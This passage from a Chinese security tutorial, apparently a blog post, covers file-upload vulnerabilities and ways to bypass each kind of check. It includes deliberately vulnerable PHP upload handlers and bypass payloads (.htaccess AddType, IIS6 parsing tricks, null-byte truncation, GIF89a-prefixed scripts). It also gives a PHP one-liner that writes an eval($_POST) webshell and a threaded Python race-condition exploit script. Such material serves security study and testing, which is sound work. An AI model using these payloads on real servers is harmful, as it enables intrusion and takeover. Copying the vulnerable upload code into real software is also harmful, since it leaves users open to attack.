class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//文件上传漏洞演示脚本之js验证</span></span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($uploaddir)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>], $uploaddir . <span class="string">'/'</span> . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            echo <span class="string">'文件上传成功，保存于：'</span> . $uploaddir . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        exit($uploaddir . <span class="string">'文件夹不存在,请手工创建！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//print_r($_FILES);</span></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">       function checkFile() &#123;</span></span><br><span class="line"><span class="string">            var file = document.getElementsByName('upfile')[0].value;</span></span><br><span class="line"><span class="string">            if (file == null || file == "</span><span class="string">") &#123;</span></span><br><span class="line"><span class="string">                alert("</span>你还没有选择任何文件，不能上传!<span class="string">");</span></span><br><span class="line"><span class="string">                return false;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            //定义允许上传的文件类型</span></span><br><span class="line"><span class="string">            var allow_ext = "</span>.jpg|.jpeg|.png|.gif|.bmp|<span class="string">";</span></span><br><span class="line"><span class="string">            //提取上传文件的类型</span></span><br><span class="line"><span class="string">            var ext_name = file.substring(file.lastIndexOf("</span>.<span class="string">"));</span></span><br><span class="line"><span class="string">            //alert(ext_name);</span></span><br><span class="line"><span class="string">            //alert(ext_name + "</span>|<span class="string">");</span></span><br><span class="line"><span class="string">            //判断上传文件类型是否允许上传</span></span><br><span class="line"><span class="string">            if (allow_ext.indexOf(ext_name + "</span>|<span class="string">") == -1) &#123;</span></span><br><span class="line"><span class="string">                var errMsg = "</span>该文件不允许上传，请上传<span class="string">" + allow_ext + "</span>类型的文件,当前文件类型为：<span class="string">" +     ext_name;</span></span><br><span class="line"><span class="string">                alert(errMsg);</span></span><br><span class="line"><span class="string">                return false;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;form action="</span><span class="string">" method="</span>post<span class="string">" enctype="</span>multipart/form-data<span class="string">" name="</span>upload<span class="string">" onsubmit="</span><span class="keyword">return</span>     checkFile()<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>hidden<span class="string">" name="</span>MAX_FILE_SIZE<span class="string">" value="</span><span class="number">204800</span><span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    请选择要上传的文件：&lt;input type="</span>file<span class="string">" name="</span>upfile<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="</span>submit<span class="string">" name="</span>submit<span class="string">" value="</span>上传<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p><h5 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h5><p>1.通过firefox的F12修改js代码绕过验证 2.使用burp抓包直接提交，绕过js验证</p><h4 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h4><h5 id="文件头content-type字段校验（服务端MIME类型检测）"><a href="#文件头content-type字段校验（服务端MIME类型检测）" class="headerlink" title="文件头content-type字段校验（服务端MIME类型检测）"></a>文件头content-type字段校验（服务端MIME类型检测）</h5><h5 id="MIME类型介绍"><a href="#MIME类型介绍" class="headerlink" title="MIME类型介绍"></a>MIME类型介绍</h5><p><strong>MIME type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p><p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p><p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p><h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p><h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p><p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p><p>Application：用于传输应用程序数据或者二进制数据；</p><p>Message：用于包装一个E-mail消息；</p><p>Image：用于传输静态图片数据；</p><p>Audio：用于传输音频或者音声数据；</p><p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p><h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p><h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILE[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)&#123; <span class="comment">//检测content-type</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload success!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p><h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php3"</span>);</span><br><span class="line"><span class="comment">//判断上传文件类型</span></span><br><span class="line">$fileext = fileext($_FILE[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!in_array($fileext,$type))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"upload success!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>默认上传后的文件保存的名字是已获取到的名字</p><h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p></blockquote><p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p><p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p><p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p><h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p><p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p><h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p><p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p><p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p><p>查看数据包：</p><p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p><p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p><p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p><p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p><p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p><h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p><p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p><p>查看数据包：</p><p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p><p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p><p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p><p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p><p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p><p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p><p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p><p>能被解析的文件扩展名列表：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jsp </span><span class="keyword">jspx </span><span class="keyword">jspf</span></span><br><span class="line"><span class="keyword">asp </span>asa cer aspx</span><br></pre></td></tr></table></figure><p>3.配合操作系统文件命令规则</p><p>（1）上传不符合windows文件命名规则的文件名</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   　　<span class="keyword">test</span>.asp.</span><br><span class="line">   　　<span class="keyword">test</span>.asp(空格)</span><br><span class="line">   　　<span class="keyword">test</span>.php:1.jpg</span><br><span class="line">   　　<span class="keyword">test</span>.php:: <span class="variable">$DATA</span></span><br></pre></td></tr></table></figure><p>会被windows系统自动去掉不符合规则符号后面的内容。</p><p>（2）linux下后缀名大小写</p><p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p><p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p><p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   　　test.php(<span class="number">0x00</span>).jpg</span><br><span class="line">   　　test.php%<span class="number">00.</span>jpg</span><br><span class="line">   　　路径/upload/<span class="number">1.</span>php(<span class="number">0x00</span>)，文件名<span class="number">1.</span>jpg，结合/upload/<span class="number">1.</span>php(<span class="number">0x00</span>)/<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure><p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p><h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p><p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p><p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p><p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p><p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PHP    </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#ASP    </span></span><br><span class="line">&lt;!--<span class="comment">#include file="上传的txt文件路径" --&gt;</span></span><br><span class="line"><span class="comment">#JSP    </span></span><br><span class="line">&lt;jsp:inclde page=<span class="string">"上传的txt文件路径"</span>/&gt;</span><br><span class="line"><span class="keyword">or</span>  </span><br><span class="line">&amp;lt;%@<span class="keyword">include</span> file=<span class="string">"上传的txt文件路径"</span>%&gt;</span><br></pre></td></tr></table></figure><p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p><h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p><p>file_put_contents 这个函数的第二个参数 可以是数组</p><p>然后 如果代码里用正则匹配 bad word 的时候</p><p>对一个数组进行正则匹配没用</p><h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p><p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p><p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p><p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p><p>PHP使用getimagesize函数验证图片文件头</p><h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p><p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./"</span>;</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>经过几次尝试后成功成功写入shell</p><p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p><h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p><ul><li>PHPCMSv9.6.0任意文件上传</li></ul><h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p><h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p><h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 